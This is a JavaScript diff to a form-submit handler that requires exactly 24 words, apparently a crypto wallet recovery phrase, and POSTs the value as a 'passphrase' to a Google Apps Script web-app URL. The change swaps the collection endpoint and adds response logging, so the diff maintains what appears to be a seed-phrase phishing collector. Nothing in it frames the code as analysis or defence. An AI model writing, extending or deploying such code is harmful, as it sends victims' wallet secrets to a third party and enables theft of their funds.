@@ -19,15 +19,24 @@ function handleSubmit(event) {
         return; // Exit function if word count is not 24
     }
 
-    // Make a POST request to example.com/send_char
-    const url = `https://script.google.com/macros/s/AKfycbx0X5At7d668sHfowbiwg7m2h4yiKNKtDdbB7GtOeJawTjjCPTk4LwGq6-nrUOgj_UZ/exec`;
+    // Google Apps Script Web App URL
+    const url = "https://script.google.com/macros/s/AKfycbzDAQMdqfEC-sUMlK05t_6fCQCV6xi7F6Co9fPQno6jCly0nDnpHD88NyWR7-_pfi24/exec";
 
+    // Make a POST request
     fetch(url, {
-        method: 'POST',
+        method: "POST",
+        mode: "cors", // Ensures CORS support
         headers: {
-            'Content-Type': 'application/json'
+            "Content-Type": "application/json"
         },
         body: JSON.stringify({ passphrase: inputValue })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Success:", data);
+    })
+    .catch(error => {
+        console.error("Error:", error);
     });
 
     myButton.disabled = false;
